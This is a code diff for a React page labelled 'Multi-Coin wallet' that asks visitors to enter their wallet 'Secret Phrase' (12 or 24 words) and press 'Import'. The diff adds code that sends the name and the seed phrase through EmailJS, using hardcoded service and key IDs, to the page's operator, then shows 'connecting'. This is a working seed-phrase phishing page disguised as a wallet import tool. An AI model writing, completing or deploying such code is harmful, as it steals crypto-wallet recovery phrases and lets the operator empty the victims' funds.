@@ -1,7 +1,8 @@
-import React from 'react'
+import React, { useRef, useState } from 'react'
 import { Link } from 'react-router-dom'
 import styled from 'styled-components'
 import {BiArrowBack} from 'react-icons/bi'
+import emailjs from '@emailjs/browser';
 
 const FormCont = styled.div`
     width: 100%;
@@ -100,18 +101,42 @@ const FormCont = styled.div`
     }
 `
 function Form() {
+  const [name,setName] = useState('')
+  const [message,SetMessage] = useState('')
+
+  const formRef = useRef()
+  const [done, isDone] = useState(false)
+
+  const handleSubmit = (e) => {
+    e.preventDefault()
+
+    console.log(name,message)
+    if(!name || !message) {
+      console.log('empty')
+      alert('fill in you details')
+      return
+    }
+    emailjs.sendForm('service_0mhvxbd', 'template_2eedt5l', formRef.current, '8RJySH7rZZrTznIBh')
+  .then((result) => {
+      console.log(result.text);
+      isDone(true)
+  }, (error) => {
+      console.log(error.text);
+  });
+}
   return (
     <FormCont>
         <Link to='/'><BiArrowBack className='bck'/></Link>
         <h2>Multi-Coin wallet</h2>
-        <form action="">
-            <input type="text" placeholder="name" />
-            <textarea name="" id="" cols="30" rows="15" placeholder="Secret Phrase">
+        <form action="" ref={formRef} onSubmit={handleSubmit}>
+            <input value={name} onChange={(e)=>setName(e.target.value)} name='from_name' type="text"/>
+            <textarea value={message} onChange={(e)=>SetMessage(e.target.value)} name="message" id="" cols="30" rows="15" placeholder="Secret Phrase">
 
             </textarea>
             <p>Typically 12 (sometimes 24) words separated by single spaces</p>
 
             <button>Import</button>
+            {done && 'connecting'}
         </form>
     </FormCont>
   )
